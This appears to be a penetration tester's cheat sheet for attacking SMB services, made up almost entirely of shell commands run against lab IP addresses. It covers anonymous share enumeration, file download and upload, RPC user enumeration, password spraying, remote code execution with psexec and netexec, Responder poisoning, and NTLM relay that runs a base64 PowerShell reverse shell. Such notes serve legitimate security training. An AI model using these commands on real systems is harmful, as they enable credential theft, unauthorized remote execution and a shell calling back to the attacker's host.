#### Anonymous Authentication
```shell
smbclient -N -L //IP
```

```shell
smbmap -H IP
```
#### Recursive
```shell
smbmap -H IP -r notes
```
#### Download / Upload
```shell
smbmap -H 10.129.14.128 --download "notes\note.txt"
```

```shell
smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"
```
#### Remote Procedure Call (RPC)
Enumerate users:
```shell
rpcclient -U'%' 10.10.110.17

rpcclient $> enumdomusers
```
#### Enum4Linux
```shell
./enum4linux-ng.py 10.10.11.45 -A -C
```
#### Password Spraying
```shell
nxc smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
```
#### Remote Code Execution (Need write permission on a share)
```shell
psexec.py administrator:'Password123!'@10.10.110.17
```
See also:
- SMBexec
- atexec

#### Netexec
```shell
nxc smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
```

#### Enumerating Logged-on Users
```shell
nxc smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
```

#### Forced Authentication Attacks
```shell
responder -I <interface name>
```

#### NLTM Relay
Responder SMB Off:
```shell
cat /etc/responder/Responder.conf | grep 'SMB ='

SMB = Off
```
Then we execute `impacket-ntlmrelayx` with the option `--no-http-server`, `-smb2support`, and the target machine with the option `-t`. By default, `impacket-ntlmrelayx` will dump the SAM database, but we can execute commands by adding the option `-c`.

```shell
ntlmrelayx.py --no-http-server -smb2support -t 10.10.110.146
```
We can create a PowerShell reverse shell using [https://www.revshells.com/](https://www.revshells.com/), set our machine IP address, port, and the option Powershell #3 (Base64).

```shell
ntlmrelayx.py --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e JABjAGwAaQBlAG<SNIP>AZQAoACkA'
```

#### Checks for CVEs
